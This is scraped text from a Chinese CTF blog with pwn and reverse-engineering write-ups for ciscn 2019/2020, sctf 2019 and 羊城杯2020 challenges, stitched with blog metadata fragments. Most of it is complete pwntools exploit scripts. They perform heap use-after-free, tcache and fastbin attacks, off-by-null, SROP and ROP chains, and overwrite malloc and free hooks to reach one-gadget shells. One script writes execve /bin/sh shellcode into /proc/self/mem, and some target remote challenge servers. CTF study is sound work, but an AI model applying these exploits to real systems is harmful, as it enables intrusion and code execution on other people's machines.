[0x45216,0x4526a,0xf02a4,0xf1147] rce18 = [0x4f2c5,0x4f322,0x10a38c] realloc = [0x2,0x4,0x6,0xB,0xC,0xD] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() ' line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x0d 0xc000003e if (A != ARCH_X86_64) goto 0015 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x00 0x01 0x40000000 if (A &lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x0a 0xffffffff if (A != 0xffffffff) goto 0015 0005: 0x15 0x09 0x00 0x00000009 if (A == mmap) goto 0015 0006: 0x15 0x08 0x00 0x0000000a if (A == mprotect) goto 0015 0007: 0x15 0x07 0x00 0x00000029 if (A == socket) goto 0015 0008: 0x15 0x06 0x00 0x0000002a if (A == connect) goto 0015 0009: 0x15 0x05 0x00 0x00000031 if (A == bind) goto 0015 0010: 0x15 0x04 0x00 0x00000032 if (A == listen) goto 0015 0011: 0x15 0x03 0x00 0x00000038 if (A == clone) goto 0015 0012: 0x15 0x02 0x00 0x00000039 if (A == fork) goto 0015 0013: 0x15 0x01 0x00 0x0000003b if (A == execve) goto 0015 0014: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0015: 0x06 0x00 0x00 0x00000000 return KILL ' ru('0x') libc_base = int(r(12),16) - libc.sym['puts'] info_addr('libc_base',libc_base) free_hook = 0x3c67a8 + libc_base read = libc.sym['read'] + libc_base puts = libc.sym['puts'] + libc_base open = libc.sym['open'] + libc_base pop_rdi= 0x0000000000021102 + libc_base pop_rsi = 0x00000000000202e8 + libc_base pop_rdx = 0x0000000000001b92 + libc_base syscall_ret = libc.search(asm(\"syscall \\nret\")).next() + libc_base # syscall_ret = libc_base + 0x00000000000bc375 #: syscall; ret; frame = SigreturnFrame() frame.rax = 0 frame.rdi = 0 frame.rsi = free_hook frame.rdx = 0x300 frame.rip = syscall_ret frame.rsp = free_hook payload = str(frame)[8:] #前8字节是rt_sigreturn 其并不需要伪造。程序是主动调用的 sigreturn # print(hex(len(frame))) s(payload) orw = flat([ pop_rdi,0,pop_rsi,free_hook,pop_rdx,8,read, pop_rdi,free_hook,pop_rsi,0,pop_rdx,0,open, pop_rdi,3,pop_rsi,free_hook,pop_rdx,0x30,read, pop_rdi,free_hook,puts ]) s(orw) sleep(0.2) s('./flag') # debug() itr() 题记payload = str(frame)[8:] 对于为什么要从8字节开始的理解？ 前8字节是rt_sigreturn,其有什么用？ 在第二步的时候，内核会帮用户进程将其上下文保存在该进程的栈上，然后在栈顶填上一个地址rt_sigreturn，这个地址指向一段代码，在这段代码中会调用sigreturn系统调用。因此，当signal handler执行完之后，栈指针（stack pointer）就指向rt_sigreturn，所以，signal handler函数的最后一条ret指令会使得执行流跳转到这段sigreturn代码，被动地进行sigreturn系统调用,把原来保存的寄存器信息弹回去，最后恢复进程的执行。 由此可以得出，因为程序是主动调用sigreturn的，并不需要rt_sigreturn指向一段代码，再调用sigreturn系统调用。 ciscn_2019_final_4这个题还是很好的题目，考察了很多的基础知识点。 分析 开启了沙盒禁用execve 开头让你输入name，有一段可控的栈空间，且较大 pie保护没有开 存在反调试，使用ptrace做的，直接gdb attach过去会进入子程序，看不到堆情况(直接在fork 汇编处，改汇编，jmp 到程序输出字符串的地方即可 ) watch函数中也用ptrace，监视了open，mmap，fork，vfork，ptrace while ( 1 ) &#123; ptrace(PTRACE_SYSCALL, a1, 0LL, 0LL); waitpid(a1, &amp;stat_loc, 0); if ( !(stat_loc &amp; 0x7F) || (char)((char)((stat_loc &amp; 0x7F) + 1) &gt;&gt; 1) &gt; 0 || (stat_loc &amp; 0xFF00) &gt;&gt; 8 != 5 ) break; ptrace(PTRACE_GETREGS, a1, 0LL, &amp;v3); v2 = v4; if ( v4 == 2 || v2 == 9 || v2 == 0x39 || v2 == 0x3A || v2 == 0x65 ) &#123; puts(\"hey! what are you doing?\"); exit(-1); &#125; &#125; 这里可以监视一下execve，好像就可以不用开沙箱了。 漏洞点存在uaf 难点orw的rop chain往哪里读程序自身是存在较少的gadgets的，想直接完成orw 的rop chain，是不可能的。上来因为没开pie，能简单的完成一个read功能。在泄漏libc以后，就有更大的发挥空间了。 开头name有一大块可控地址，该怎么使用上。先输入一段垃圾数据，留着寻找。 sa('name','chumen77'*10) 在控制malloc hook后，随意写个地址，让其crash在这里，查看下栈地址： data = 3 * '\\x00' + p64(0xdeadbeef) add(0x68,data) 发现断在0xdeadbeef，栈上可以看到输入的name情况。 此处来一个栈劫持，增加rsp 指针0x38 ，接着ret上去，就可以执行name上的东西，这个东西肯定写成仅能完成的read rop chain。 因为pie没开，可以使用这个新的read 在bss段上读取一个新的rop chain，接着ret 上去执行。新的rop chain，可以为mprotect解开bss段的执行权限，接着跳上orw flag的shellcode即可。（mprotect 需要指出的是，指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。 这里直接设置为bss起始地址即可。） open被禁用了怎么办可以使用openat进行代替。 #include &lt;fcntl.h&gt; int open(const char *path, int oflag, mode_t mode); int openat(int fd, const char *path, int oflag, mode_t mode ); //函数执行成功返回文件描述符，失败返回-1. https://blog.csdn.net/liangzc1124/article/details/83475246 https://www.cnblogs.com/BinBinStory/p/7400993.html 其中重点就是，当openat的path参数，输入是绝对地址时，fd就会被无视，其函数就相当于open了。所以此处的fd，也是可以设成任意值。 exp#!/usr/bin/env python # encoding: utf-8 from pwn import * import time local_file = './ciscn_final_4' elf = ELF(local_file) context.log_level = 'debug' debug = 1 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',25080) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(size,data): sla('&gt;&gt;','1') sla('size',str(size)) sa('tent',str(data)) def free(idx): sla('&gt;&gt;','2') sla('index',str(idx)) def show(idx): sla('&gt;&gt;','3') sla('index',str(idx)) bss = 0x6021C0 pop_rdi = 0x0000000000401193 pop_rsi_r15 = 0x0000000000401191 pop_rsp_r13_r14_r15 = 0x000000000040118d orw = flat([pop_rdi,0,pop_rsi_r15,bss + 0x400,0,elf.plt['read'],pop_rsp_r13_r14_r15,bss + 0x400,0,0,0]) sa('name',str(orw)) # sa('name','chumen77'*10) add(0x1000,'1') add(0x10,'2') free(0) show(0) r() libcbase = uu64(r(6)) - 0x3c4b78 info_addr('libcbase',libcbase) add(0x68,'3') add(0x68,'4') add(0x68,'5') free(2) free(3) free(2) malloc_hook = 0x3c4afd + libcbase add(0x68,p64(malloc_hook)) add(0x68,'7') add(0x68,'8') rsp_add_0x38 = libc.search(asm(\"add rsp , 0x38\\nret\")).next() data = 3 * '\\x00' + p64(rsp_add_0x38 + libcbase) # data = 3 * '\\x00' + p64(0xdeadbeef) add(0x68,data) # debug() sla('&gt;&gt;','1') sla('size','20') sleep(0.2) pop_rdx = libcbase + libc.search(asm(\"pop rdx\\nret\")).next() pop_rsp = libcbase + libc.search(asm(\"pop rsp\\nret\")).next() mprotect = libcbase + libc.sym['mprotect'] payload = flat([pop_rdi,0x00602000,pop_rsi_r15,0x1000,0,pop_rdx,7,mprotect,0x602628]) shellcode = shellcraft.linux.openat(0,'/flag',0) + shellcraft.linux.read(3,bss+0x200,0x30) + shellcraft.linux.write(1,bss+0x200,0x30) sleep(0.2) s(p64(0)*3 + payload + p64(0) + asm(shellcode)) # debug() itr() 延伸做法https://n132.github.io/2019/12/08/2019-12-08-UAF-With-Out-One_gadget/ 其是用house_of_orange+setcontext+0x35调用read传入ropchain来完成攻击。 如果无法控制free_hook且在libc-2.23情况下可以利用这个办法。 sctf_2019_one_heap分析 不可指定idx，来操作chunk，只能操作当前malloc 分配chunk对应的heap地址 只有free 和 add，free可以4次，add可以0xf次 难点 无show函数 有限的free次数，只能通过合适的堆技巧或者爆破来完成攻击 此题由于只能4次free，其中3次free还是直接必须执行的，只剩下的一次就尤为关键。目标就是在其free以后，有办法让再次申请的chunk可以修改到这个free chunk对应tcache bin的fd，来进行tcache attack。 当一个堆A同时在tcache里面，又在unsortbin里面，这种情况是常见的，并且也是危险的。 当先申请一个小的chunk C，其肯定是在此chunk上按照unsortbin的规则，分割一下，留下一个小的unsortbin bin。 然后接着申请一个相同于chunk A大小的堆，就有机会改到这个2个被分割完的小chunk。比如改0x61的unsortbin的信息，可以改其size，并且提前在chunk B处伪造好数据，即可完成一个fake 的 unsortbin。 倘若再申请一个合适的大小，比如0x68，即可改到chunk B的数据。此题也就是改其fd指针，即可接着完成tcache attack。 exp#!/usr/bin/env python # encoding: utf-8 from pwn import * import time local_file = './sctf_2019_one_heap' elf = ELF(local_file) context.log_level = 'debug' debug = 1 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',27411) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] rce18 = [0x4f2c5,0x4f322,0x10a38c] roc = [0x2,0x4,0x6,0xB,0xC,0xD] arae16 = 0x3c4b78 arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(size,data): sla('ice','1') sla('size',str(size)) sa('tent',str(data)) def free(): sla('ice','2') def leak_addr(): add(0x7f,'chumen77' + '\\n') free() free() add(0x7f,'\\n') add(0x7f,'\\n') #夹在top chunk前面，防止进入unsortbin时直接合并。并且fake一些数据，留着绕过后面的检查。 add(0x30,p64(0)*4+p64(0x90) + p64(0x20)) free() add(0x7f,'\\n') free() add(0x28,p16(0x9750) + '\\n') debug() # 修改剩下0x60大小的unsortbin的大小为0x90，且前面已经有fake的数据，不会让程序crush add(0x7f,p64(0)*5 + p64(0x91) +'\\n') payload = p64(0)*2 + p64(0xfbad3c80) + p64(0) * 3 + '\\x00' add(0x7f,payload + '\\n') leak = 0 while True: try: leak_addr() ss = io.recvuntil(chr(0x7f),timeout = 0.5) if len(ss) == 0: raise Exception('') io.recv(16) leak = u64(io.recv(8)) if leak == 0x320a6464412e310a: raise Exception('') break except Exception: io.close() io = process('./sctf_2019_one_heap') # io = remote('node3.buuoj.cn',28690) continue leak = leak &gt;&gt; 16 info_addr('leak',leak) libc_base = leak - 4110208 info_addr('libc_base',libc_base) malloc_hook = 0x3ebc30 + libc_base payload = p64(0) * 11 + p64(0x41) + p64(malloc_hook-8) debug() # 修改0x40 tcache bin的chain add(0x68,payload) debug() add(0x38,'\\n') realloc=libc_base+libc.symbols['realloc'] + roc[1] one = 0x10a38c + libc_base payload = p64(one) + p64(realloc) add(0x38,payload + '\\n') add(0x20,'\\n') # debug() itr() ciscn_2019_es_4分析利用off by null，构造chunk overlapping，然后tcache attack即可。 exp#!/usr/bin/env python # encoding: utf-8 from pwn import * import time local_file = './ciscn_2019_es_4' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',26094) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce18 = [0x4f2c5,0x4f322,0x10a38c] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(idx,size,data): sl('1') sla('dex',str(idx)) sla('size',str(size)) sa('tent',str(data)) sleep(0.1) def free(idx): sl('2') sla('dex',str(idx)) sleep(0.1) def show(idx): sl('4') sla('dex',str(idx)) sleep(0.1) def edit(idx,data): sl('3') sla('dex',str(idx)) sa('tent',str(data)) sleep(0.1) add(0,0x80,'\\n') add(1,0x98,'\\n') add(2,0xa8,'\\n') add(3,0xf0,'\\n') for i in range(7): add(i+4,0x80,'\\n') for i in range(7): free(i+4) add(i+4,0xf0,'\\n') for i in range(7): free(i+4) free(0) edit(2,'\\x00'*0xa0+p64(0x1e0)) free(3) free(1) add(3,0xa0,'\\x00'*0x80+p64(0x90)+p64(0xa0)+p64(0x00000000006022B0)) add(4,0x98,'\\n') add(5,0x98,p64(0xdeadbeefdeadbeef)*2) add(6,0x98,'\\n') show(6) r() libcbase = uu64(r(6)) - 0x3ebc0a info_addr('libcbase',libcbase) free(6) free(2) add(7,0x98,p64(0)*15+p64(0xb1)+p64(0x3ed8e8+libcbase)) add(8,0xa0,'\\n') add(9,0xa0,p64(libcbase+rce18[1])) free(8) itr()","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"}]},{"title":"ciscn 2020 华中分区赛部分wp","slug":"ciscn 2020 华中分区赛部分wp","date":"2020-09-24T00:09:06.574Z","updated":"2020-09-26T12:18:50.233Z","comments":true,"path":"2020/09/24/ciscn 2020 华中分区赛部分wp/","link":"","permalink":"http://chumen77.xyz/2020/09/24/ciscn 2020 华中分区赛部分wp/","excerpt":"","text":"ciscn 2020 华中分区赛部分wp第一天跟6级冲突了，基本没玩，第二天做完一个题ida炸了，怎么也打不开。最近，总是关键时刻掉链子了😭。 logic_mistake分析 可以申请16个堆，size信息放在其chunk地址的下8个字节 通过strdup来进行申请堆， strdup 相当于s = input() malloc(stren(s)) edit函数 read(0, *((void **)&amp;unk_202060 + 2 * v1), dword_202068[4 * v1]); 这里由于是这样的判断，结合add的strdup 就造成了堆溢出。 攻击思路 申请8个0x90大小的堆块，size 填成0xff，留着溢出 申请3个0x80大小的堆块，size 填成0xff，留着溢出 释放前8个堆，最后一个进入unsortbin 申请一个0x90的堆块，会申请到tcache的头的堆，也就是第7个堆 edit溢出修改到next chunk的size 和prev size，让show 出libc信息 接着修改unsortbin的size 为0x80，开始进行tcache attack，也就是溢出修改tcache chian上的堆地址，修改为free hook 然后申请堆到free hook，打one gadgetsexp from pwn import * import time local_file = './pwn' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('172.20.12.248',50001) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(idx,size,data): sla('4.show','1') sla('Input index:',str(idx)) sla('Input size',str(size)) sa('note',str(data)) def edit(idx,data): sla('4.show','3') sla('dex',str(idx)) sa('note',str(data)) def show(idx): sla('4.show','4') sla('dex',str(idx)) def free(idx): sla('4.show','2') sla('dex',str(idx)) for i in range(8): payload = '1' * 0x80 add(i,0xff,payload) payload = '1' * 0x70 add(10,0xff,payload) add(11,0xff,payload) add(12,0xff,payload) for i in range(7): free(i) free(7) payload = '1' * 0x80 add(6,0xff,payload) payload = '1' * 0x80 + '2' * 8 + p64(0xdeadbeefdeadbeef) edit(6,payload) show(6) ru('22222222') r(8) libc_base = uu64(r(6)) - 0x3ebca0 info_addr('libc',libc_base) payload = '1' * 0x80 + p64(0) + p64(0x81) edit(6,payload) payload = '1' * 0x70 add(13,0xff,payload) free(11) free(10) free_hook = 0x3ed8e8 + libc_base payload = '1' * 0x80 + p64(0x90) + p64(0x80) + p64(free_hook) edit(13,payload) payload = '1' * 0x70 add(14,0xff,payload) one = 0x4f3c2 + libc_base add(15,0xff,payload) edit(15,p64(one)) free(14) itr() safe shell分析登陆函数：!strcmp(name, &amp;s) &amp;&amp; !strcmp(password, &amp;ptr); 在最后的验证是用strcmp，会被\\x00给截断，并且服务器上的admin.txt上来也是空的。直接设置name与password均为\\x00即可绕过。 shell函数： 都是围绕/proc/self/目录下的操作 set_lseek可以修改读取某文件指针，也就是open以后默认操作读写指针是指向文件的开头的，通过它可以修改这个指针的在这个文件上指向 write 一次只能写8字节 重点是了解/proc/pid/目录下文件的信息与含义。https://blog.csdn.net/enweitech/article/details/53391567 特别注意 mmaps 和 mem maps是当前进程的内存映射关系，存放着内存分布图，类似于gdb中vmmap，可以泄漏一下程序的基地址。 mem 包含了程序进程在内存中的内容； 通过修改该文件相当于直接修改当前进程的内存 / proc / $pid / mem以与进程中相同的方式显示$pid的内存映射,即伪文件中偏移x处的字节与进程中地址x处的字节相同.。 结合maps的映射信息来确定读的偏移值。即无法读取未被映射的区域，只有读取的偏移值是被映射的区域才能正确读取内存内容。 写入mem文件也相当于修改程序在内存的本身了，结合mmaps的程序基址，在合适的地方写入shellcode，让程序走到这里即可get shell 防御函数：在监测到3次密码错误后，开始拒绝连接，并且会在admin.txt中写入随机的512个字母数字组合的字符。这样就基本登陆不上去了,因为是随机的，并且name跟password最大也就是0x100的长度。 攻击思路 绕过check，登入diy shell 读入mmaps，leak 出 程序的base open mem文件，准备写入 确定写入偏移为help后0x16CC + base,通过set_lseek来修改指针指向 wirte 写入8字节shellcode 通过set_lseek来修改指针+8，再次写入，循环写好shellcode 输入help即可 expfrom pwn import * import time local_file = './safe_shell' elf = ELF(local_file) context.log_level = 'debug' debug = 1 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',27411) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() sa('name','\\x00') sa('pass','\\x00') sl('readonly') sla('name','maps') s = ru('-5') s = s[2:14] base = int(s,16) info_addr('base',base) patch_addr = 0x16CC + base sl('open') sla('name','mem') shellcode = '\\x6a\\x3b\\x58\\x99\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xeb\\x08\\x53\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05' for i in range(len(shellcode)//8+1): sl('set_lseek') sla(' file offset',str(patch_addr + i*8)) sla('$','write') sa('your context',shellcode[i*8:(i*8+8)]) sl('help') itr()","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"}]},{"title":"羊城杯2020部分wp","slug":"羊城杯2020部分wp","date":"2020-09-14T12:56:01.475Z","updated":"2020-09-24T02:49:43.921Z","comments":true,"path":"2020/09/14/羊城杯2020部分wp/","link":"","permalink":"http://chumen77.xyz/2020/09/14/羊城杯2020部分wp/","excerpt":"","text":"羊城杯2020部分wpreloginPython exe的逆向。其中在修复pyc时，个人不是很熟悉，记录一下： 在脱去以后，会有主程序，跟一个struct的文件。 要保证主程序与struct的前面的魔法字节是相同一样的。 重点关注前16个字节，保证相同即可。修复好pyc后，就可以进行反编译。剩下的就是逆算法，需要用到z3。 exp#!/usr/bin/env python2.7 from z3 import * ''' a1 = Int('a1') a2 = Int('a2') a3 = Int('a3') a4 = Int('a4') a5 = Int('a5') a6 = Int('a6') a7 = Int('a7') a8 = Int('a8') a9 = Int('a9') a10 = Int('a10') a11 = Int('a11') a12 = Int('a12') a13 = Int('a13') a14 = Int('a14') s.add(a1 * 88 + a2 * 67 + a3 * 65 - a4 * 5 + a5 * 43 + a6 * 89 + a7 * 25 + a8 * 13 - a9 * 36 + a10 * 15 + a11 * 11 + a12 * 47 - a13 * 60 + a14 * 29 == 22748) s.add(a1 * 89 + a2 * 7 + a3 * 12 - a4 * 25 + a5 * 41 + a6 * 23 + a7 * 20 - a8 * 66 + a9 * 31 + a10 * 8 + a11 * 2 - a12 * 41 - a13 * 39 + a14 * 17 == 7258) s.add(a1 * 28 + a2 * 35 + a3 * 16 - a4 * 65 + a5 * 53 + a6 * 39 + a7 * 27 + a8 * 15 - a9 * 33 + a10 * 13 + a11 * 101 + a12 * 90 - a13 * 34 + a14 * 23 == 26190) s.add(a1 * 23 + a2 * 34 + a3 * 35 - a4 * 59 + a5 * 49 + a6 * 81 + a7 * 25 + a8 * (2 ** 7) - a9 * 32 + a10 * 75 + a11 * 81 + a12 * 47 - a13 * 60 + a14 * 29 == 37136) s.add(a1 * 38 + a2 * 97 + a3 * 35 - a4 * 52 + a5 * 42 + a6 * 79 + a7 * 90 + a8 * 23 - a9 * 36 + a10 * 57 + a11 * 81 + a12 * 42 - a13 * 62 - a14 * 11 == 27915) s.add(a1 * 22 + a2 * 27 + a3 * 35 - a4 * 45 + a5 * 47 + a6 * 49 + a7 * 29 + a8 * 18 - a9 * 26 + a10 * 35 + a11 * 41 + a12 * 40 - a13 * 61 + a14 * 28 == 17298) s.add(a1 * 12 + a2 * 45 + a3 * 35 - a4 * 9 - a5 * 42 + a6 * 86 + a7 * 23 + a8 * 85 - a9 * 47 + a10 * 34 + a11 * 76 + a12 * 43 - a13 * 44 + a14 * 65 == 19875) s.add(a1 * 79 + a2 * 62 + a3 * 35 - a4 * 85 + a5 * 33 + a6 * 79 + a7 * 86 + a8 * 14 - a9 * 30 + a10 * 25 + a11 * 11 + a12 * 57 - a13 * 50 - a14 * 9 == 22784) s.add(a1 * 8 + a2 * 6 + a3 * 64 - a4 * 85 + a5 * 73 + a6 * 29 + a7 * 2 + a8 * 23 - a9 * 36 + a10 * 5 + a11 * 2 + a12 * 47 - a13 * 64 + a14 * 27 == 9710) s.add(a1 * 67 - a2 * 68 + a3 * 68 - a4 * 51 - a5 * 43 + a6 * 81 + a7 * 22 - a8 * 12 - a9 * 38 + a10 * 75 + a11 * 41 + a12 * 27 - a13 * 52 + a14 * 31 == 13376) s.add(a1 * 85 + a2 * 63 + a3 * 5 - a4 * 51 + a5 * 44 + a6 * 36 + a7 * 28 + a8 * 15 - a9 * 6 + a10 * 45 + a11 * 31 + a12 * 7 - a13 * 67 + a14 * 78 == 24065) s.add(a1 * 47 + a2 * 64 + a3 * 66 - a4 * 5 + a5 * 43 + a6 * 112 + a7 * 25 + a8 * 13 - a9 * 35 + a10 * 95 + a11 * 21 + a12 * 43 - a13 * 61 + a14 * 20 == 27687) s.add(a1 * 89 + a2 * 67 + a3 * 85 - a4 * 25 + a5 * 49 + a6 * 89 + a7 * 23 + a8 * 56 - a9 * 92 + a10 * 14 + a11 * 89 + a12 * 47 - a13 * 61 - a14 * 29 == 29250) s.add(a1 * 95 + a2 * 34 + a3 * 62 - a4 * 9 - a5 * 43 + a6 * 83 + a7 * 25 + a8 * 12 - a9 * 36 + a10 * 16 + a11 * 51 + a12 * 47 - a13 * 60 - a14 * 24 == 15317) if s.check() == sat: result = s.model() print result ''' ''' [a2 = 24, a13 = 88, a6 = 43, a9 = 52, a14 = 33, a5 = 104, a12 = 74, a7 = 28, a1 = 119, a10 = 108, a11 = 88, a8 = 91, a4 = 7, a3 = 10] ''' key = [10,24,119,7,104,43,28,91,108,52,88,74,88,33] flag = ' ' for i in range(13,0,-1): key[i-1] = key[i] ^ key[i - 1] flag += chr(key[i-1]) flag = flag[::-1] flag += chr(33) print(flag) 其中在z3中处理逻辑运算时，是很特殊的，这个需要注意，具体可以看z3的官方文档。可以参考：https://arabelatso.github.io/2018/06/14/Z3%20API%20in%20Python/ 还有遇到逻辑左移右移： 1. “&gt;&gt;” int x = 16; printf(\"%d\\n\", x &gt;&gt; 1); 先将x转成二进制 10000, 不读最后一位， 输出 1000， 即为8; 右移一位相当于数值除以2 2. “&lt;&lt;” int x = 16; printf(\"%d\\n\", x &lt;&lt; 1); 先将x转成二进制 10000, 往最后再读取一位(0, 或根据是否已经有移位)， 输出 100000， 即为32; 左移，若移动位数K等于或大于数据长度N,通常只移动K mod N 位数 左移一位相当于数值乘以2 在这里是左移7，也就是乘 2 的7次方。 easyre分析3层加密. 一个base64 一个以13字节，分割字符，进行移位 单字节凯撒加密，但是也加入了对数字的处理 expimport base64 key = 'EmBmP5Pmn7QcPU4gLYKv5QcMmB3PWHcP5YkPq3=cT6QckkPckoRG' key = [ord(c) for c in key] buf = [0]*52 for i in range(len(key)): if key[i] &gt; 64 and key[i] &lt;=90: buf[i] = (key[i] - 65 - 3) % 26 + 65 continue if key[i] &gt; 96 and key[i] &lt;=122: buf[i] = (key[i] - 97 - 3) % 26 + 0x61 continue if key[i] &gt; 47 and key[i] &lt;=57: buf[i] = (key[i] - 48 - 3) % 10 + 48 continue buf[i] = key[i] buf = [chr(c) for c in buf] key2 = '' for i in buf: key2 += i key2 = key2[13:26] + key2[39:52] + key2[:13] + key2[26:39] flag = base64.b64decode(key2) print(flag) pwnsing in入门堆题，存在uaf，进行fastbin attcak即可。 expfrom pwn import * import time local_file = './pwn' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('183.129.189.60',10029) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(size,name,mes): sla('Your choice :','1') sla('size',str(size)) sa('name',str(name)) sla('mes',str(mes)) def show(): sla('Your choice :','2') def free(idx): sla('Your choice :','3') sla('index:',str(idx)) payload = 'a' * 0x60 mes = 'b' * 23 add(0x100,payload,mes) add(0x60,payload,mes) free(0) add(0x60,' ',mes) show() ru(\"Game[2]'s name :\") libc_base = uu64(r(6)) - 0x3c4b20 info_addr('libc_base',libc_base) free(2) free(1) free(2) malloc_hook = libc_base + 0x3c4aed add(0x60,p64(malloc_hook),p64(malloc_hook)) add(0x60,p64(malloc_hook),p64(malloc_hook)) add(0x60,p64(malloc_hook),p64(malloc_hook)) one = 0x4527a + libc_base payload = '1' * 11 + p64(0) + p64(one) add(0x60,payload,payload) itr() 其中可以申请一个堆，进行getshell，也可以同时2次free同一个chunk，触发报错函数，而调用报错函数的时候又会用到malloc_hook，从而getshell。 babypwn程序分析 只有add和del功能 存在uaf 只能申请&lt;0x70的堆块 前置技能需要利用scanf函数来触发malloc_consolidate，使相邻fastbin堆块进行合并，并放入unsortedbin的 队列。 参考链接： https://www.anquanke.com/post/id/176139 https://blog.csdn.net/plus_re/article/details/79265805 malloc_consolidate具体步骤如下： 判断fastbin是否初始化，如果未初始化，则进行初始化然后退出。 按照fastbin由小到大的顺序（0x20 ,0x30 ,0x40这个顺序）合并chunk，每种相同大小的fastbin中chunk的处理顺序是从fastbin-&gt;fd开始取，下一个处理的是p-&gt;fd，依次类推。 首先尝试合并pre_chunk。 